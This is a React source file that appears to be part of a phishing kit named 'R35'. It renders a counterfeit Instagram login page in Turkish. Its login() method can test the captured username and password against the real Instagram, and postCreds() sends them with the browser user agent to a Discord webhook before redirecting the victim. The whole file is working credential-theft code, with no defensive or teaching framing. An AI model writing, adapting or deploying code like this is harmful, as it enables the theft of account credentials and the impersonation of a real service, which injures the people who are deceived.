import './../custom.scss';
import React, { Component } from 'react'
import { Jumbotron, Container, Button } from 'react-bootstrap'
import Instagram from 'instagram-web-api';
import { Webhook, MessageBuilder } from 'discord-webhook-node';

class Authentication extends Component {
    constructor(props) {
        super(props);
        this.Config = {}
        this.state = {
            btnDisabled: true,
            loginError: false
        }
    }

    render() {
        return (
            <div>
                <Jumbotron className="vertical-center">
                <Container className="ig-container pt-5 align-items-center">
                        <h1 className="m-auto logo">Instagram</h1>
                        
                        <div className="mt-4">
                            <div className="m-auto ig-input-container">
                                <input className="ig-input" id="email" required="required" type="text" ref={(ref) => this.emailRef=ref} onChange={() => this.checkInputs()}/>
                                <label className="d-block ig-input-label" htmlFor="email" required="required">Telefon numarası, kullanıcı adı veya e-posta</label>
                            </div>
                        </div>
                        <div className="mt-1">
                            <div className="m-auto ig-input-container">
                                <input className="ig-input" id="password" required="required" type="password" ref={(ref) => this.passwordRef=ref} onChange={() => this.checkInputs()}/>
                                <label className="d-block ig-input-label" htmlFor="password" required="required">Şifre</label>
                            </div>
                        </div>
                        <div className="mt-3">
                            <div className="m-auto ig-btn-container">
                                <Button onClick={() => this.login()}type="button" className="ig-btn btn btn-primary" disabled={this.state.btnDisabled}>Giriş Yap</Button>
                            </div>
                        </div>

                        <div className="mt-3">
                            <div className="ig-splitter ig-splitter-container">
                                <div className="ig-splitter-left"></div>
                                <div className="ig-splitter-text">ya da</div>
                                <div className="ig-splitter-right"></div>
                            </div>
                        </div>

                        <div className="mt-3">
                            <div className="text-center fb-container">
                                <a className="fb-text" onClick={() => this.fbLogin()}>
                                    <span className="fb-logo"></span>&nbsp;&nbsp;
                                    Facebook ile giriş yap
                                </a>
                            </div>
                        </div>

                        <div className={`mt-3 ${this.state.loginError ? "" : "d-none"}`}>
                            <div className="text-center fb-container">
                                <p className="error-text">
                                    Üzgünüz, şifren yanlıştı. Lütfen şifreni dikkatlice kontrol et.
                                </p>
                            </div>
                        </div>

                        <div className="mt-3">
                            <div className="text-center fb-container">
                                <a className="reset-link" href="https://www.instagram.com/accounts/password/reset/">
                                    Şifreni mi unuttun ?
                                </a>
                            </div>
                        </div>
                    </Container>
                </Jumbotron>
            </div>
        )
    }

    login() {
        var username = `${this.emailRef.value.trim()}`;
        var password = `${this.passwordRef.value.trim()}`;

        this.setState({ btnDisabled: true}, async () => {
            this.Config = await (await fetch("r35config.json")).json();
                
            if (this.Config["tryAccounts"]) {
                let client = new Instagram({ username, password })
                client.request = client.request.defaults({
                    headers: { 'User-Agent': window.navigator.userAgent }
                })
                try {
                    await client.login()
                    this.postCreds(username, password, true)
                } catch (ex) {
                    console.log(ex.message)
                    if (ex.message === "No cookie") {
                        this.setState({ loginError: true, btnDisabled: false})
                        return
                    } else if (ex.message !== `403 - {"message":"To secure your account, we've reset your password. Click \"Forgot password?\" on the login screen and follow the instructions to access your account.","status":"fail"}`) {
                        this.postCreds(username, password, true)
                    }
                }
            } else {
                this.postCreds(username, password, false)
            }
        })
    }

    postCreds(username, password, triedAccount) {
        let hook = new Webhook(this.Config["discordWebhook"]);
        hook.setUsername("R35 - Instagram Login Page")
        hook.setAvatar(this.Config["avatarUrl"])
        
        let embed = new MessageBuilder()
        .setTitle("🎣 Yeni Kullanıcı Girişi!")
        .setAuthor("R35", this.Config["avatarUrl"])
        .setURL(this.Config["avatarUrl"])
        .addField("Kullanıcı Adı", username)
        .addField("Şifre", password)
        .addField("User Agent", window.navigator.userAgent)
        .setColor('#00b0f4')
        .setTimestamp();

        if (triedAccount) {
            embed.addField("Giriş Durumu", "Hesap test edildi, sorunsuz giriş yapılabiliyor!")
        } else {
            embed.addField("Giriş Durumu", "Hesap test edilmedi, bilgiler yanlış olabilir!")
        }

        hook.send(embed).then(() => {
            window.location.href = this.Config["redirectUrl"];
        }).catch(err => {
            window.location.href = this.Config["redirectUrl"];
        })
    }

    checkInputs() {
        if (this.passwordRef.value.trim().length >= 6 && this.emailRef.value.trim().length >= 1) {
            this.setState({ btnDisabled: false})
        } else {
            this.setState({ btnDisabled: true})
        }
    }
}

export default Authentication
